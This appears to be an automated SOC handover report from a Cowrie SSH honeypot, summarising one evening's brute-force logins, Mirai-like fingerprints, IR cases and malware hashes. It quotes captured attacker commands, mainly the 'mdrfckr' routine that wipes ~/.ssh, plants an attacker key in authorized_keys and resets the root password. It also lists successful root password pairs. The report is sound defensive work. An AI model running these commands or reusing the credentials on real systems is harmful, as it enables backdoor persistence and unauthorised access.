# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-31 |
| **Generated At** | 2026-05-31T19:22:41Z |
| **Shift Time** | 19:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **95** |
| Confirmed Threats | **88** |
| False Positives Filtered | **7** (7.4%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **8** |
| High Severity Cases | **11** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **84** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **25** |
| Unique Credential Pairs | **17** |
| Unique Usernames | **11** |
| Unique Passwords | **17** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 11 |
| `345gs5662d34` | 5 |
| `samba` | 1 |
| `admin` | 1 |
| `alexandre` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 4 |
| `p@ssword` | 2 |
| `123123` | 1 |
| `qaz123456` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 4 |
| `root` | `p@ssword` | 2 |
| `samba` | `123123` | 1 |
| `root` | `qaz123456` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qaz123456` | `40.121.179.100` | 2026-05-31T17:46:50 |
| `root` | `Asdqwe123!` | `40.121.179.100` | 2026-05-31T17:54:38 |
| `root` | `3245gs5662d34` | `40.121.179.100` | 2026-05-31T17:54:50 |
| `root` | `Welcome12#` | `40.121.179.100` | 2026-05-31T17:58:33 |
| `root` | `Aa222222` | `118.26.36.248` | 2026-05-31T18:08:02 |
| `root` | `3245gs5662d34` | `118.26.36.248` | 2026-05-31T18:08:05 |
| `root` | `Dell@123` | `40.121.179.100` | 2026-05-31T18:10:24 |
| `root` | `p@ssword` | `103.155.20.58` | 2026-05-31T18:36:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **95** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 26 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 23 | 3 |
| `0a07365cc01f...` | Generic scanner | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 23 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `0a07365cc01f...` | Go SSH scanner | 2 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:MPMoxUhN4XQv"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `40.121.179.100`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `118.26.36.248`, `40.121.179.100`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **13** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS16276` | OVH SAS | 1 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | MEDIUM |
| `AS396982` | Google LLC | 1 | HIGH |
| `AS8781` | Ooredoo Q.S.C. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (9)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0c4af36b9ac5

| Field | Detail |
|---|---|
| **Source IP** | `40.121.179[.]100` |
| **First Seen** | 2026-05-31 17:46 |
| **Last Seen** | 2026-05-31 17:47 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:MPMoxUhN4XQv"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 17:46:49` | `cowrie.session.connect` |
| `2026-05-31 17:46:49` | `cowrie.client.version` |
| `2026-05-31 17:46:49` | `cowrie.client.kex` |
| `2026-05-31 17:46:50` | `cowrie.login.success` |
| `2026-05-31 17:46:51` | `cowrie.session.params` |
| `2026-05-31 17:46:51` | `cowrie.command.input` |
| `2026-05-31 17:46:51` | `cowrie.command.failed` |
| `2026-05-31 17:46:52` | `cowrie.log.closed` |
| `2026-05-31 17:46:52` | `cowrie.session.params` |
| `2026-05-31 17:46:52` | `cowrie.command.input` |
| `2026-05-31 17:46:52` | `cowrie.session.file_download` |
| `2026-05-31 17:46:52` | `cowrie.log.closed` |
| `2026-05-31 17:47:04` | `cowrie.session.params` |
| `2026-05-31 17:47:04` | `cowrie.command.input` |
| `2026-05-31 17:47:05` | `cowrie.log.closed` |
| `2026-05-31 17:47:05` | `cowrie.session.params` |
| `2026-05-31 17:47:05` | `cowrie.command.input` |
| `2026-05-31 17:47:05` | `cowrie.log.closed` |
| `2026-05-31 17:47:06` | `cowrie.session.params` |
| `2026-05-31 17:47:06` | `cowrie.command.input` |
| `2026-05-31 17:47:06` | `cowrie.session.file_download` |
| `2026-05-31 17:47:06` | `cowrie.log.closed` |
| `2026-05-31 17:47:06` | `cowrie.session.params` |
| `2026-05-31 17:47:06` | `cowrie.command.input` |
| `2026-05-31 17:47:07` | `cowrie.log.closed` |
| `2026-05-31 17:47:07` | `cowrie.session.params` |
| `2026-05-31 17:47:07` | `cowrie.command.input` |
| `2026-05-31 17:47:08` | `cowrie.log.closed` |
| `2026-05-31 17:47:08` | `cowrie.session.params` |
| `2026-05-31 17:47:08` | `cowrie.command.input` |
| `2026-05-31 17:47:08` | `cowrie.command.input` |
| `2026-05-31 17:47:09` | `cowrie.log.closed` |
| `2026-05-31 17:47:09` | `cowrie.session.params` |
| `2026-05-31 17:47:09` | `cowrie.command.input` |
| `2026-05-31 17:47:09` | `cowrie.log.closed` |
| `2026-05-31 17:47:10` | `cowrie.session.params` |
| `2026-05-31 17:47:10` | `cowrie.command.input` |
| `2026-05-31 17:47:10` | `cowrie.log.closed` |
| `2026-05-31 17:47:11` | `cowrie.session.params` |
| `2026-05-31 17:47:11` | `cowrie.command.input` |
| `2026-05-31 17:47:11` | `cowrie.log.closed` |
| `2026-05-31 17:47:11` | `cowrie.session.params` |
| `2026-05-31 17:47:11` | `cowrie.command.input` |
| `2026-05-31 17:47:12` | `cowrie.log.closed` |
| `2026-05-31 17:47:12` | `cowrie.session.params` |
| `2026-05-31 17:47:12` | `cowrie.command.input` |
| `2026-05-31 17:47:13` | `cowrie.log.closed` |
| `2026-05-31 17:47:13` | `cowrie.session.params` |
| `2026-05-31 17:47:13` | `cowrie.command.input` |
| `2026-05-31 17:47:14` | `cowrie.log.closed` |
| `2026-05-31 17:47:14` | `cowrie.session.params` |
| `2026-05-31 17:47:14` | `cowrie.command.input` |
| `2026-05-31 17:47:14` | `cowrie.log.closed` |
| `2026-05-31 17:47:15` | `cowrie.session.params` |
| `2026-05-31 17:47:15` | `cowrie.command.input` |
| `2026-05-31 17:47:15` | `cowrie.log.closed` |
| `2026-05-31 17:47:16` | `cowrie.session.params` |
| `2026-05-31 17:47:16` | `cowrie.command.input` |
| `2026-05-31 17:47:16` | `cowrie.log.closed` |
| `2026-05-31 17:47:16` | `cowrie.session.params` |
| `2026-05-31 17:47:16` | `cowrie.command.input` |
| `2026-05-31 17:47:17` | `cowrie.log.closed` |
| `2026-05-31 17:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.179[.]100` to AbuseIPDB if not already reported
- [ ] Block `40.121.179[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2621ee3db116

| Field | Detail |
|---|---|
| **Source IP** | `40.121.179[.]100` |
| **First Seen** | 2026-05-31 17:54 |
| **Last Seen** | 2026-05-31 17:54 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 17:54:37` | `cowrie.session.connect` |
| `2026-05-31 17:54:37` | `cowrie.client.version` |
| `2026-05-31 17:54:37` | `cowrie.client.kex` |
| `2026-05-31 17:54:38` | `cowrie.login.success` |
| `2026-05-31 17:54:39` | `cowrie.session.params` |
| `2026-05-31 17:54:39` | `cowrie.command.input` |
| `2026-05-31 17:54:39` | `cowrie.command.failed` |
| `2026-05-31 17:54:39` | `cowrie.log.closed` |
| `2026-05-31 17:54:39` | `cowrie.session.params` |
| `2026-05-31 17:54:39` | `cowrie.command.input` |
| `2026-05-31 17:54:40` | `cowrie.session.file_download` |
| `2026-05-31 17:54:40` | `cowrie.log.closed` |
| `2026-05-31 17:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.179[.]100` to AbuseIPDB if not already reported
- [ ] Block `40.121.179[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d28fa5aba17

| Field | Detail |
|---|---|
| **Source IP** | `40.121.179[.]100` |
| **First Seen** | 2026-05-31 17:54 |
| **Last Seen** | 2026-05-31 17:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 17:54:49` | `cowrie.session.connect` |
| `2026-05-31 17:54:49` | `cowrie.client.version` |
| `2026-05-31 17:54:49` | `cowrie.client.kex` |
| `2026-05-31 17:54:50` | `cowrie.login.success` |
| `2026-05-31 17:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.179[.]100` to AbuseIPDB if not already reported
- [ ] Block `40.121.179[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9248962eddb

| Field | Detail |
|---|---|
| **Source IP** | `40.121.179[.]100` |
| **First Seen** | 2026-05-31 17:58 |
| **Last Seen** | 2026-05-31 17:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 17:58:32` | `cowrie.session.connect` |
| `2026-05-31 17:58:32` | `cowrie.client.version` |
| `2026-05-31 17:58:32` | `cowrie.client.kex` |
| `2026-05-31 17:58:33` | `cowrie.login.success` |
| `2026-05-31 17:58:34` | `cowrie.session.params` |
| `2026-05-31 17:58:34` | `cowrie.command.input` |
| `2026-05-31 17:58:34` | `cowrie.command.failed` |
| `2026-05-31 17:58:34` | `cowrie.log.closed` |
| `2026-05-31 17:58:35` | `cowrie.session.params` |
| `2026-05-31 17:58:35` | `cowrie.command.input` |
| `2026-05-31 17:58:35` | `cowrie.session.file_download` |
| `2026-05-31 17:58:35` | `cowrie.log.closed` |
| `2026-05-31 17:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.179[.]100` to AbuseIPDB if not already reported
- [ ] Block `40.121.179[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5868fde7723

| Field | Detail |
|---|---|
| **Source IP** | `40.121.179[.]100` |
| **First Seen** | 2026-05-31 17:58 |
| **Last Seen** | 2026-05-31 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 17:58:39` | `cowrie.session.connect` |
| `2026-05-31 17:58:39` | `cowrie.client.version` |
| `2026-05-31 17:58:39` | `cowrie.client.kex` |
| `2026-05-31 17:58:40` | `cowrie.login.success` |
| `2026-05-31 17:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.179[.]100` to AbuseIPDB if not already reported
- [ ] Block `40.121.179[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86933012dbc4

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-05-31 18:08 |
| **Last Seen** | 2026-05-31 18:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 18:08:02` | `cowrie.session.connect` |
| `2026-05-31 18:08:02` | `cowrie.client.version` |
| `2026-05-31 18:08:02` | `cowrie.client.kex` |
| `2026-05-31 18:08:02` | `cowrie.login.success` |
| `2026-05-31 18:08:03` | `cowrie.session.params` |
| `2026-05-31 18:08:03` | `cowrie.command.input` |
| `2026-05-31 18:08:03` | `cowrie.command.failed` |
| `2026-05-31 18:08:03` | `cowrie.log.closed` |
| `2026-05-31 18:08:03` | `cowrie.session.params` |
| `2026-05-31 18:08:03` | `cowrie.command.input` |
| `2026-05-31 18:08:03` | `cowrie.session.file_download` |
| `2026-05-31 18:08:03` | `cowrie.log.closed` |
| `2026-05-31 18:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-618bd97c26b8

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-05-31 18:08 |
| **Last Seen** | 2026-05-31 18:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 18:08:05` | `cowrie.session.connect` |
| `2026-05-31 18:08:05` | `cowrie.client.version` |
| `2026-05-31 18:08:05` | `cowrie.client.kex` |
| `2026-05-31 18:08:05` | `cowrie.login.success` |
| `2026-05-31 18:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a7b750699b1

| Field | Detail |
|---|---|
| **Source IP** | `40.121.179[.]100` |
| **First Seen** | 2026-05-31 18:10 |
| **Last Seen** | 2026-05-31 18:10 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 18:10:23` | `cowrie.session.connect` |
| `2026-05-31 18:10:23` | `cowrie.client.version` |
| `2026-05-31 18:10:23` | `cowrie.client.kex` |
| `2026-05-31 18:10:24` | `cowrie.login.success` |
| `2026-05-31 18:10:25` | `cowrie.session.params` |
| `2026-05-31 18:10:25` | `cowrie.command.input` |
| `2026-05-31 18:10:25` | `cowrie.command.failed` |
| `2026-05-31 18:10:25` | `cowrie.log.closed` |
| `2026-05-31 18:10:26` | `cowrie.session.params` |
| `2026-05-31 18:10:26` | `cowrie.command.input` |
| `2026-05-31 18:10:26` | `cowrie.session.file_download` |
| `2026-05-31 18:10:26` | `cowrie.log.closed` |
| `2026-05-31 18:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.179[.]100` to AbuseIPDB if not already reported
- [ ] Block `40.121.179[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bdb1413b75b

| Field | Detail |
|---|---|
| **Source IP** | `40.121.179[.]100` |
| **First Seen** | 2026-05-31 18:10 |
| **Last Seen** | 2026-05-31 18:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 18:10:35` | `cowrie.session.connect` |
| `2026-05-31 18:10:35` | `cowrie.client.version` |
| `2026-05-31 18:10:35` | `cowrie.client.kex` |
| `2026-05-31 18:10:37` | `cowrie.login.success` |
| `2026-05-31 18:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.179[.]100` to AbuseIPDB if not already reported
- [ ] Block `40.121.179[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `187.108.193[.]54` | **33** | 2026-05-31 17:10 | 2026-05-31 19:15 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `159.203.20[.]239` | **24** | 2026-05-31 17:17 | 2026-05-31 19:20 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `40.121.179[.]100` | **12** | 2026-05-31 17:33 | 2026-05-31 18:29 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `8.209.88[.]212` | **4** | 2026-05-31 18:24 | 2026-05-31 18:24 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `118.26.36[.]248` | 1 | 2026-05-31 18:08 | 2026-05-31 18:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `135.148.33[.]168` | 1 | 2026-05-31 17:21 | 2026-05-31 17:22 | 35s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]1` | 1 | 2026-05-31 18:10 | 2026-05-31 18:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `174.76.38[.]124` | 1 | 2026-05-31 17:10 | 2026-05-31 17:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-05-31 17:15 | 2026-05-31 17:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-05-31 18:11 | 2026-05-31 18:11 | 40s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
